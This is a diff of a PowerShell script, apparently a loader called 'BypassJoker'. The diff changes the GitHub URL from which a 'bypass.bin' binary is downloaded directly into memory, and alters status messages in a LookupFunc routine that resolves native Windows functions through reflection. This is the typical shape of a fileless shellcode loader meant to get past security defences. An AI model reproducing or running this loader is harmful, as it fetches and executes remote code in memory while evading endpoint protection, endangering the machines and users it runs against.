@@ -1,5 +1,5 @@
 # URL do arquivo binário
-$url = "https://raw.githubusercontent.com/Gstzin/BypassJoker/main/public/bypass.bin"
+$url = "https://github.com/Gstzin/BypassJoker/raw/main/public/bypass.bin"
 
 # Baixar os bytes diretamente para a memória
 $webClient = New-Object System.Net.WebClient
@@ -12,11 +12,10 @@ function LookupFunc {
     $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
     [IntPtr] $result = 0
     try {
-        
-        Write-Host "Done, continuing..."
+        Write-Host "Continuing..."
         $result = $tmp[0].Invoke($null, @($handle, $functionName))
     } catch {
-        Write-Host "Done, continuing..."
+        Write-Host "Continuing..."
         $handle = New-Object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle)
         $result = $tmp[0].Invoke($null, @($handle, $functionName))
     }
